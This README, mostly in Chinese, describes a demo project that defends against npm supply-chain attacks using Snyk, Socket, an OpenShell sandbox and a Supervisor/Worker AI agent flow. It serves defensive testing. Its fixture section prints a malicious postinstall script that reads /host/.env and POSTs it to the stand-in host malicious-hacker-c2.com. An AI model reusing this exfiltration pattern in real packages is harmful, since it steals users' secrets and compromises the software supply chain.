# ChainShield Lab

ChainShield Lab 是一個展示型 PoC，用來示範如何用 AI Agent 編排供應鏈攻擊防禦流程，並把靜態 dependency 掃描與執行期 sandbox 串成可觀察、可驗證的防線。

本專案聚焦 npm supply chain attack demo，展示三層防線：

1. **Snyk Gate**：阻擋已知 high / critical CVE。
2. **Socket Gate**：阻擋 dependency risk 或組織安全政策違規。
3. **OpenShell Gate**：在安裝階段阻擋越權讀檔與非授權 C2 外連。

此 repo 以 demo、驗證與架構探索為目的，不是 production CI/CD rollout。

## 架構概念

```text
                 Host System
                      |
                      v
        +-----------------------------+
        | Claude / Codex Supervisor   |
        | - read scan reports         |
        | - make allow / deny decision|
        +--------------+--------------+
                       |
                       v
        +-----------------------------+
        | NemoClaw Worker / Nemotron  |
        | - run tool commands         |
        | - collect logs              |
        +--------------+--------------+
                       |
                       v
        +-----------------------------+
        | OpenShell Sandbox           |
        | - filesystem allowlist      |
        | - per-binary egress policy  |
        | - deny logs                 |
        +--------------+--------------+
                       |
             allowed   |   denied
             npm registry   malicious C2
```

## 核心元件

- **Supervisor Agent**：接收使用者安裝或評估需求，讀取 Snyk / Socket 報告，套用 gate 規則後決定放行或拒絕。
- **Worker Agent**：只讀取 sanitized task packet 與 artifact refs，產生 evidence summary；不直接執行掃描、sandbox、shell 或 host lifecycle command。
- **Snyk CLI**：偵測已知 CVE 與高風險 dependency 版本。
- **Socket.dev CLI**：掃描 dependency metadata 與組織 security / license policy 風險。
- **NVIDIA NemoClaw / OpenShell**：提供 sandbox 執行、filesystem allowlist、出站網路控管與 deny log。
- **Nemotron Worker**：彙整 sanitized artifact refs 並輸出 Worker evidence summary；最終決策仍由 Supervisor 套用 deterministic gate rules。

## Nemotron Model 選型

目前 PoC 建議使用 **Nemotron 3 Nano** 作為 Worker model。

此專案中的 Nemotron Worker 主要負責 evidence summary 任務：

- 讀取 sanitized worker task packet。
- 檢查 Snyk / Socket report 與 OpenShell deny log 的 artifact refs。
- 產生 `finding_status=clear|concern|inconclusive` 的 Worker evidence summary。
- 在 provider unavailable 時提供可追蹤 fallback evidence。
- 將摘要回傳給 Supervisor；不得要求或執行 shell、scanner、sandbox 或 host lifecycle command。

這些工作偏向 command execution、log collection 與輕量摘要，不需要由 Worker 承擔複雜安全推理。因此目前架構會把主要判斷責任放在 **Claude / Codex Supervisor**，由 Supervisor 彙整報告後決定 `allow` 或 `deny`。

建議配置：

```text
Claude / Codex Supervisor
  - 彙整 Snyk / Socket / OpenShell 證據
  - 判斷 allow / deny
  - 產生 deny reason 與 next action

Nemotron 3 Nano Worker
  - 讀取 sanitized task packet
  - 彙整 reports / logs refs
  - 產生 Worker evidence summary
```

只有在 Nemotron 需要承擔較重的推理角色時，才建議升級為 **Nemotron 3 Super**。例如：

- 讓 Nemotron 直接擔任 Supervisor。
- 對多份安全報告做跨工具關聯分析。
- 判斷 Snyk、Socket 與 OpenShell 結果互相衝突的案例。
- 產生完整資安分析報告或 remediation plan。

以目前要實作的功能來看，**Nemotron 3 Nano 已足夠，且更符合 Worker 的角色定位**。

## 專案目標

- 建立一個可重現的 demo 流程，讓使用者看到套件安裝前後的安全控制點。
- 透過 Snyk 與 Socket 先做 dependency gate，避免高風險套件進入安裝階段。
- 在刻意繞過靜態 gate 的情境下，用 OpenShell 驗證 sandbox 能阻止敏感檔案讀取與惡意 C2 外連。
- 用 Supervisor / Worker agent flow 展示 AI 如何讀取報告、彙整證據並做出放行或拒絕決策。

## 不在範圍內

- 不建立 production CI/CD 部署流程。
- 不承諾完整 SOC / SIEM 整合。
- 不發布真實惡意 package 到 public registry。
- 不把 Socket 定位為本地任意 JavaScript 原始碼惡意行為分析器。
- 不以 LLM 取代人工資安審查，只示範報告彙整與決策輔助。

## 環境需求

- macOS Apple Silicon。
- Python 3.11+ 與本專案測試相依套件。
- Node.js 20+ 與 npm 10+。
- Fixture-first demo 不需要登入 Snyk、Socket、NVIDIA API 或啟動 OrbStack。
- Live scanner mode 才需要已登入的 Snyk CLI 與 Socket CLI。
- Live sandbox mode 才需要 OrbStack、Docker 相容 runtime 與可執行的 OpenShell/NemoClaw CLI；不得 fallback 到宿主機 `npm install`。

安裝並登入掃描工具：

```bash
npm install -g snyk
snyk auth

npm install -g socket
socket login
```

## Fixture-First Demo

所有 demo config 均只引用 repository-local sanitized fixtures，並將 runtime output 寫入 `/reports/`。若 output path 已存在，CLI 會拒絕覆寫並要求使用新的 output path。

```bash
.venv/bin/python -m chainshield.cli evaluate --config fixtures/configs/demo-fixture-deny.json
.venv/bin/python -m chainshield.cli evaluate --config fixtures/configs/demo-fixture-allow.json
.venv/bin/python -m chainshield.cli evaluate --config fixtures/configs/demo-fixture-manual-review.json
```

預期結果：

- `demo-fixture-deny.json`：Snyk high/critical 或 Socket unhealthy/policy/malware evidence 造成 `deny`，不進入 sandbox install。
- `demo-fixture-allow.json`：Snyk 與 Socket sanitized fixture 皆通過，且未執行 sandbox demo，因此可輸出 deterministic `allow`。
- `demo-fixture-manual-review.json`：Socket gate 被 `skip`，輸出 `manual_review`、`missing_gates=["socket"]`，下一步要求補齊 sanitized evidence/config 並重新執行 Supervisor。
- Markdown 摘要頂部固定顯示 result、主要理由、缺失 gate 與下一步，供審查者不重跑 demo 時在 30 秒內辨識核心資訊。

## Worker Provider Demo

Worker provider 只產生 sanitized evidence summary，不執行 shell、scanner、sandbox 或 host lifecycle command，也不能覆寫 Snyk、Socket、OpenShell 的 deterministic gate rules。

```bash
export NVIDIA_API_KEY="<set-in-shell-only>"
export NEMOTRON_BASE_URL="${NEMOTRON_BASE_URL:-https://integrate.api.nvidia.com/v1}"
export NEMOTRON_MODEL="${NEMOTRON_MODEL:-nvidia/nemotron-3-nano-30b-a3b}"

.venv/bin/python -m chainshield.cli evaluate --config fixtures/configs/demo-worker-nemotron.json
.venv/bin/python -m chainshield.cli evaluate --config fixtures/configs/demo-worker-fallback.json
```

Worker evidence rules:

- Canonical provider chain 為 `nemotron_api` -> `codex_subagent` -> `claude_subagent` -> `manual_review`。
- Primary provider failure 後的 fallback order 固定為 `codex_subagent` -> `claude_subagent` -> `manual_review`。
- 每次 provider attempt 預設 timeout 為 60 秒。
- `finding_status=clear` 只在 Snyk、Socket 與必要 OpenShell gate 都通過時支援 `allow`。
- `finding_status=concern`、`inconclusive`、缺失 worker evidence、provider unavailable 或 boundary violation 皆導向 `manual_review`，不得直接形成 `deny`。
- 若 Worker output 要求執行 `npm install`、`postinstall`、Snyk/Socket/OpenShell command 或未授權 tool invocation，Supervisor 會記錄 boundary violation evidence 並拒絕採用該 output。

## 建議目錄結構

```text
supply-chain-attack/
  README.md
  fixtures/
    malicious-poc-pkg/
      package.json
      index.js
      scripts/
        exfiltrate.js
    poc-app/
      package.json
      package-lock.json
  policies/
    openshell-npm-install.yaml
  reports/
    snyk.json
    socket.json
    openshell.log
```

## OpenShell Policy 範例

OpenShell policy 使用 allowlist 模型。未列入 `filesystem_policy.read_only` 或 `filesystem_policy.read_write` 的路徑不可存取；未被 `network_policies` 授權的外連會被拒絕並寫入 log。

實作時需要依實際 sandbox image 調整 binary path，例如 `/usr/bin/node`、`/usr/local/bin/node`、`/usr/bin/npm` 或 `/usr/local/bin/npm`。

```yaml
version: 1

filesystem_policy:
  include_workdir: true
  read_only:
    - /usr
    - /lib
    - /lib64
    - /etc
    - /bin
    - /sbin
    - /dev/urandom
  read_write:
    - /sandbox
    - /tmp
    - /dev/null

landlock:
  compatibility: best_effort

process:
  run_as_user: sandbox
  run_as_group: sandbox

network_policies:
  npm_registry_readonly:
    name: npm-registry-readonly
    endpoints:
      - host: registry.npmjs.org
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-only
    binaries:
      - { path: /usr/bin/node }
      - { path: /usr/bin/npm }
```

展示重點：

- `registry.npmjs.org:443` 被允許，npm 可以下載 dependency metadata 與 tarball。
- `malicious-hacker-c2.com` 不在 allowlist 中，postinstall script 嘗試外連時應被拒絕。
- Host 的 `~/.ssh`、`~/.aws`、專案外 `.env` 不會被列入可讀路徑，腳本不應讀到宿主機敏感資料。

## PoC Fixture

### 惡意套件

`fixtures/malicious-poc-pkg/package.json`：

```json
{
  "name": "malicious-poc-pkg",
  "version": "1.0.0",
  "description": "NPM supply chain attack PoC for Snyk and OpenShell",
  "main": "index.js",
  "scripts": {
    "postinstall": "node scripts/exfiltrate.js"
  },
  "dependencies": {
    "lodash": "4.17.4"
  }
}
```

`lodash@4.17.4` 用於觸發 Snyk 的已知漏洞偵測。`postinstall` script 則用於 OpenShell dynamic block demo。

`fixtures/malicious-poc-pkg/scripts/exfiltrate.js`：

```javascript
const fs = require('fs');
const http = require('http');

console.log('[poc] postinstall script started');

try {
  const envData = fs.readFileSync('/host/.env', 'utf8');

  const req = http.request('http://malicious-hacker-c2.com/payload', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  });

  req.write(JSON.stringify({ data: envData }));
  req.end();
} catch (error) {
  console.log('[poc] action blocked or failed:', error.message);
}
```

### Demo App

`fixtures/poc-app/package.json`：

```json
{
  "name": "poc-app",
  "version": "1.0.0",
  "private": true,
  "description": "Application fixture for dependency scanning demo",
  "dependencies": {
    "malicious-poc-pkg": "file:../malicious-poc-pkg/malicious-poc-pkg-1.0.0.tgz"
  }
}
```

建立 fixture package 與 lockfile：

```bash
cd fixtures/malicious-poc-pkg
npm pack

cd ../poc-app
npm install --package-lock-only
```

`poc-app` 的 lockfile 讓 Snyk 與 Socket 掃描可重現 dependency tree。實際安裝 demo 應交給 OpenShell sandbox 執行。

## Demo 流程

### 1. Snyk Gate

```bash
cd fixtures/poc-app
snyk test --json --severity-threshold=high
```

預期結果：

- Snyk 偵測到 dependency tree 中的 `lodash@4.17.4`。
- 若報告包含 high 或 critical vulnerability，CLI 回傳非 0。
- Supervisor 判定不合規，中止安裝流程並記錄漏洞證據。

### 2. Socket Gate

```bash
socket scan create --report --json ./fixtures/poc-app
```

或使用 CI-like 流程：

```bash
cd fixtures/poc-app
socket ci
```

預期結果：

- Socket 上傳 manifest / lockfile metadata，產生 dependency scan report。
- 若 dependency 違反組織 security / license policy，report 顯示 `healthy: false` 或 CLI 回傳非 0。
- Supervisor 依 Socket policy 結果拒絕或放行。

注意：Socket 這一層不承諾分析本地 `scripts/exfiltrate.js` 原始碼，也不把 `malicious-code` 警報列為 PoC 必然結果。它的 demo 範圍是 dependency risk 與 org policy gate。

### 3. OpenShell Dynamic Block

為了展示第三層防線，可以刻意繞過 Snyk / Socket gate，直接讓 Worker 在 OpenShell sandbox 中安裝本地 malicious tarball：

```bash
npm install ./malicious-poc-pkg-1.0.0.tgz
```

預期結果：

- `postinstall` script 啟動。
- 讀取 `/host/.env` 失敗，因為該路徑不在 filesystem allowlist。
- `http://malicious-hacker-c2.com/payload` 不在 network allowlist，外連被 OpenShell 拒絕。
- OpenShell log 中可看到類似 `action=deny`、`dst_host=malicious-hacker-c2.com`、`deny_reason="no matching network policy"` 的紀錄。
- Worker 收集 log 並回報 Supervisor：「第三層 sandbox 成功阻斷外傳」。

## Supervisor 決策規則

最小可行規則：

- Snyk exit code 非 0 且報告包含 high / critical vulnerability 時，拒絕。
- Socket report 回傳 `healthy: false` 或 CLI exit code 非 0 時，拒絕。
- OpenShell log 顯示未授權檔案或網路存取時，拒絕。
- 只有所有必要 gate 都通過時才放行。

建議讓 Supervisor 輸出結構化證據：

```json
{
  "decision": "deny",
  "deny_reason": "known_vulnerability",
  "evidence": [
    {
      "tool": "snyk",
      "package": "lodash",
      "version": "4.17.4",
      "severity": "high"
    }
  ],
  "next_action": "stop_install"
}
```

## 成功指標

- [ ] **Snyk gate 可驗證**：對 `fixtures/poc-app` 執行 Snyk 後，high 或 critical vulnerability 會讓流程中止。
- [ ] **Socket gate 可驗證**：Socket scan report 可被 Supervisor 讀取，並能根據 `healthy` 或 exit code 做出拒絕 / 放行決策。
- [ ] **OpenShell 檔案隔離可驗證**：postinstall script 無法讀取 sandbox allowlist 外的敏感檔案。
- [ ] **OpenShell 網路隔離可驗證**：惡意 C2 外連不成功，且 deny log 可被查詢。
- [ ] **Host 未受污染**：PoC 安裝與惡意腳本只在 sandbox 中執行，不修改宿主機憑證、shell 設定或專案外檔案。
- [ ] **Agent 決策可追蹤**：Supervisor 的拒絕理由可回溯到 Snyk report、Socket report 或 OpenShell log。

## 已知限制

- NemoClaw / OpenShell 版本與 CLI 介面可能變動，實作前需用本機安裝版本重新確認 policy schema 與 command flags。
- macOS Apple Silicon 需依賴 Docker Desktop 或 Colima 的 Linux sandbox 環境。
- Socket 掃描的是 manifest / lockfile dependency metadata，不是本地惡意 JavaScript 的完整靜態分析。
- Snyk 與 Socket 都需要帳號、token 與網路連線。
- 此 PoC 聚焦 npm supply chain demo，不處理所有 package manager。

## 後續補強

- 加入 `scripts/run-demo.sh`，把 fixture 建立、Snyk scan、Socket scan、OpenShell install 與 log 收集串成一鍵流程。
- 將 Supervisor 決策規則寫成明確 JSON schema，例如 `allow`、`deny_reason`、`evidence`、`next_action`。
- 為 OpenShell policy 增加 PyPI、GitHub API 或 private registry 的分層 allowlist 範例。
- 加入 report fixture，讓無法登入 Snyk / Socket 的環境也能展示 Supervisor 判讀流程。
- 加入清理流程，確保 sandbox、npm tarball、暫存 report 可以安全移除。

## 參考文件

- NVIDIA OpenShell Policy Schema: https://docs.nvidia.com/openshell/reference/policy-schema
- NVIDIA OpenShell Network Policy Tutorial: https://docs.nvidia.com/openshell/latest/get-started/tutorials/first-network-policy
- Socket Scan CLI: https://docs.socket.dev/docs/socket-scan
- Socket CI CLI: https://docs.socket.dev/docs/socket-ci
- Snyk CLI `test`: https://docs.snyk.io/developer-tools/snyk-cli/commands/test
